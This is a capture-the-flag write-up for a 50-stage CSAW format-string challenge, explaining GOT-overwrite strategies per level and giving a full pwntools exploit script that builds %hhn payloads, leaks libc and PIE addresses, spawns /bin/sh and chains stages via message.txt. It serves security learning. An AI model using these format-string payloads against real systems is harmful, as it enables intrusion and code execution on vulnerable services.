# procrastination-simulator

## Challenge

For each stage, we enter a password and are given a hexdump of the binary running on that stage.

Each stage has a format string vulnerability such as the following:

```c
// stage 1
void sym.runChallenge noreturn (void)

{
    int32_t unaff_EBX;
    int32_t in_GS_OFFSET;
    char *format;
    int32_t var_ch;
    
    sym.__x86.get_pc_thunk.bx();
    var_ch = *(int32_t *)(in_GS_OFFSET + 0x14);
    sym.imp.puts(unaff_EBX + 0xf61);
    sym.imp.printf(unaff_EBX + 0xf91);
    sym.imp.puts(unaff_EBX + 0xffe);
    sym.imp.printf(unaff_EBX + 0xfff);
    sym.imp.fflush(**(undefined4 **)(unaff_EBX + 0x3f01));
    sym.imp.fgets(&format, 0x96, **(undefined4 **)(unaff_EBX + 0x3efd));
    sym.imp.puts(unaff_EBX + 0x1005);
    sym.imp.printf(&format);
    sym.imp.puts(unaff_EBX + 0x102c);
    // WARNING: Subroutine does not return
    sym.imp.exit(0);
}
```

The levels differ in architecture and mitigations.

If we read `message.txt` on each stage, we are given the port and password for the next stage.

Once we finish stage 50, we can read `flag.txt`

## Solution

### Level 1

32-bit binary, no PIE, partial RELRO, contains `win()`

Overwrite the GOT entry of `exit()` with the address of the `win()` function.

### Level 2

64-bit binary, no PIE, partial RELRO, contains `win()`

Overwrite the GOT entry of `exit()` with the address of the `win()` function.

### Level 3

64-bit binary, no PIE, partial RELRO, contains `sym.imp.system`

Overwrite the GOT entry of `exit()` with the address of the `main()` function.
The program will jump to the start of `main()` instead of exiting.

Overwrite the GOT entry of `printf()` with the address of the PLT entry for `system()`.

The program will restart again, now send it `/bin/sh` and it will execute `system("/bin/sh")`.

### Level 4

64-bit binary, PIE enabled, no RELRO, 3 `printf(&format)` calls

Leak the address of libc and the executable using `%p`.

Overwrite the GOT entry of `printf()` with the address of `system()` in libc.

Send `/bin/sh` to spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host auto-pwn.chal.csaw.io --port 11001 vuln
from pwn import *
from binascii import unhexlify
import re

# Set up pwntools for the correct architecture
# exe = context.binary = ELF('vuln')
libc = ELF('libc6_2.31-0ubuntu9.2_amd64.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'auto-pwn.chal.csaw.io'
port = int(args.PORT or 11001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

pattern = re.compile("^[0-9,a-f]{4}$")
password = b"cd80d3cd8a479a18bbc9652f3631c61c"

while True:
    io = start()

    io.sendlineafter(b"Input password to continue:\n", password)
    io.recvuntil(b"-------------------------------------------------------------------\n")

    vuln = b""

    while True:
        line = io.recvline()

        if b"-------------------------------------------------------------------\n" in line:
            break

        dump = line.split()[1:9]

        for i in dump:
            if not pattern.match(i.decode()):
                break

            vuln += unhexlify(i)

    f = open('./vuln', 'wb')
    f.write(vuln)
    f.close()
    exe = context.binary = ELF('vuln')

    overwriteAddr = exe.got['exit']
    if 'win' in exe.sym:
        overwriteData = exe.sym['win']
    else:
        overwriteData = exe.entry

    data = {}
    data[0] = overwriteData                % 0x100
    data[1] = (overwriteData // 0x100)     % 0x100
    data[2] = (overwriteData // 0x10000)   % 0x100
    data[3] = (overwriteData // 0x1000000) % 0x100

    if context.arch == "i386":
        formatstr = b""
        formatstr += "%{}c".format(data[0] + 0x100).encode()
        formatstr += b"%22$hhn"
        formatstr += "%{}c".format((data[1] - data[0]) % 0x100 + 0x100).encode()
        formatstr += b"%23$hhn"
        formatstr += "%{}c".format((data[2] - data[1]) % 0x100 + 0x100).encode()
        formatstr += b"%24$hhn"
        formatstr += "%{}c".format((data[3] - data[2]) % 0x100 + 0x100).encode()
        formatstr += b"%25$hhn"

        payload = flat({
            0x0: formatstr,
            0x42: [
                overwriteAddr,
                overwriteAddr + 1,
                overwriteAddr + 2,
                overwriteAddr + 3,
                ]
            })

        io.sendlineafter(b"Help! I need to write 60 reports by Sunday afternoon. Give me some content and I will generate a report!!", payload)
    elif not exe.pie:
        formatstr = b""
        formatstr += "%{}c".format(data[0] + 0x100).encode()
        formatstr += b"%14$hhn"
        formatstr += "%{}c".format((data[1] - data[0]) % 0x100 + 0x100).encode()
        formatstr += b"%15$hhn"
        formatstr += "%{}c".format((data[2] - data[1]) % 0x100 + 0x100).encode()
        formatstr += b"%16$hhn"
        formatstr += "%{}c".format((data[3] - data[2]) % 0x100 + 0x100).encode()
        formatstr += b"%17$hhn"

        payload = flat({
            0x0: formatstr,
            0x40: [
                overwriteAddr,
                overwriteAddr + 1,
                overwriteAddr + 2,
                overwriteAddr + 3,
                ]
            })

        io.sendlineafter(b"Help! I need to write 60 reports by Sunday afternoon. Give me some content and I will generate a report!!", payload)

        if 'win' not in exe.sym:

            io.sendlineafter(b"Input password to continue:\n", password)

            overwriteAddr = exe.got['printf']
            overwriteData = exe.plt['system']

            data = {}
            data[0] = overwriteData                % 0x100
            data[1] = (overwriteData // 0x100)     % 0x100
            data[2] = (overwriteData // 0x10000)   % 0x100
            data[3] = (overwriteData // 0x1000000) % 0x100

            formatstr = b""
            formatstr += b"%14$lln"
            formatstr += "%{}c".format(data[0] + 0x100).encode()
            formatstr += b"%14$hhn"
            formatstr += "%{}c".format((data[1] - data[0]) % 0x100 + 0x100).encode()
            formatstr += b"%15$hhn"
            formatstr += "%{}c".format((data[2] - data[1]) % 0x100 + 0x100).encode()
            formatstr += b"%16$hhn"
            formatstr += "%{}c".format((data[3] - data[2]) % 0x100 + 0x100).encode()
            formatstr += b"%17$hhn"

            payload = flat({
                0x0: formatstr,
                0x40: [
                    overwriteAddr,
                    overwriteAddr + 1,
                    overwriteAddr + 2,
                    overwriteAddr + 3,
                    ]
                })

            io.sendlineafter(b"Help! I need to write 60 reports by Sunday afternoon. Give me some content and I will generate a report!!", payload)

            io.sendlineafter(b"Input password to continue:\n", password)

            payload = b"/bin/sh"

            io.sendlineafter(b"Proceeding to the challenge...\n", payload)
    else:
        payload = b"%45$p %35$p"

        io.sendlineafter(b" in this batch!!\n> ", payload)

        io.recvuntil(b"Report 1:\n")

        libc.address = 0
        libc.address = int(io.recvuntil(b" ", drop=True), 0) - libc.libc_start_main_return
        exe.address = int(io.recvuntil(b"\n", drop=True), 0) - (0x5555555555a2 - 0x555555554000)

        overwriteAddr = exe.got['printf']
        overwriteData = libc.sym['system']

        data = {}
        data[0] = overwriteData                        % 0x100
        data[1] = (overwriteData // 0x100)             % 0x100
        data[2] = (overwriteData // 0x10000)           % 0x100
        data[3] = (overwriteData // 0x1000000)         % 0x100
        data[4] = (overwriteData // 0x100000000)       % 0x100
        data[5] = (overwriteData // 0x10000000000)     % 0x100
        data[6] = (overwriteData // 0x1000000000000)   % 0x100
        data[7] = (overwriteData // 0x100000000000000) % 0x100

        formatstr = b""
        formatstr += "%{}c".format(data[0] + 0x100).encode()
        formatstr += b"%20$hhn"
        formatstr += "%{}c".format((data[1] - data[0]) % 0x100 + 0x100).encode()
        formatstr += b"%21$hhn"
        formatstr += "%{}c".format((data[2] - data[1]) % 0x100 + 0x100).encode()
        formatstr += b"%22$hhn"
        formatstr += "%{}c".format((data[3] - data[2]) % 0x100 + 0x100).encode()
        formatstr += b"%23$hhn"
        formatstr += "%{}c".format((data[4] - data[3]) % 0x100 + 0x100).encode()
        formatstr += b"%24$hhn"
        formatstr += "%{}c".format((data[5] - data[4]) % 0x100 + 0x100).encode()
        formatstr += b"%25$hhn"
        formatstr += "%{}c".format((data[6] - data[5]) % 0x100 + 0x100).encode()
        formatstr += b"%26$hhn"
        formatstr += "%{}c".format((data[7] - data[6]) % 0x100 + 0x100).encode()
        formatstr += b"%27$hhn"

        payload = flat({
            0x0: formatstr,
            0x60: [
                overwriteAddr,
                overwriteAddr + 1,
                overwriteAddr + 2,
                overwriteAddr + 3,
                overwriteAddr + 4,
                overwriteAddr + 5,
                overwriteAddr + 6,
                overwriteAddr + 7,
                ]
            })

        io.sendlineafter(b" in this batch!!\n> ", payload)

        io.sendlineafter(b"Time to go write this!", b"/bin/sh")

    if port == 11050:
        break

    io.sendline(b"cat message.txt")

    io.recvuntil(b"nc auto-pwn.chal.csaw.io ")
    port = int(io.recvuntil(b" ", drop=True))

    io.recvuntil(b"password ")
    password = io.recvuntil(b"\n", drop=True)

    io.close()

    print(password)

io.interactive()
```

## Flag

`flag{c0ngr4tul4t10ns,4ut0-pwn3r!5h0ut0ut5_t0_UTCTF_f0r_th31r_3xc3ll3nt_AEG_ch4ll3ng3_1n_M4y}`

